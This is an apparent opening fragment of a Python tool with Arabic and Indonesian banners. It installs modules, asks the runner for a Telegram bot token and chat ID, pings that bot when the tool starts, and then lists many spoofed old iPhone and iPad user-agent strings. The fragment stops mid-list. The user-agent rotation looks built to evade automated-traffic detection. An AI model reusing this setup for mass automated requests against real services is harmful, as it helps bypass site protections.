import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os

try:
        
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
print('\n')
token=input('   \033[2;32mَ★𝗧𝙤𝙆𝙚𝙉🔥  \033[2;36m: \033[2;35m')
print('')
print('')
ID=input(f'  \033[2;36m★𝗶𝘿🔥    \033[2;36m: \033[2;35m')
KONANVIP= '\n - 🫶 قام شخص بتشغيل اداتك \n✵┈─┈─┈──𓆩AYHAM𓆪─┈─┈─┈─✵\n𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃  ➩ \nتم تشغيل الاداة \n  \n -\n\n ✵┈─┈─┈──𓆩AYHAM𓆪─┈─┈─┈─✵ '
requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(KONANVIP))
os.system('clear')
KONAN = f'''tg://openmessage?user_id={ID}'''
pretty.install()
CON=sol() 
KONAN = [
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J3 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; es-es) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2 Twitter for iPad',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J3 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_2 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7D11 Safari/528.16',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_3 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Mobile/7E18',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; es-es) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_4 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8K2 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8B117 Safari/6531.22.7',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; nl-nl) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0_1 like Mac OS X; fr-fr) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A306 Safari/6531.22.7',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; ko-kr) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2 Twitter for iPad',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F191',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_3 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7E18 Safari/528.16',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; fr-fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_4 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8K2 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8H7',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_6 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8E200',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2 Twitter for iPad',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F191',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8H7',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8H7',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; nl-nl) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F190 Twitter for iPad',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/6531.22.7',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; sv-se) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148a',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8H7',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_3 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7E18 Safari/528.16',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Mobile/8A306',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; fi-fi) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; fr-fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J3 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J3 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) ,AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
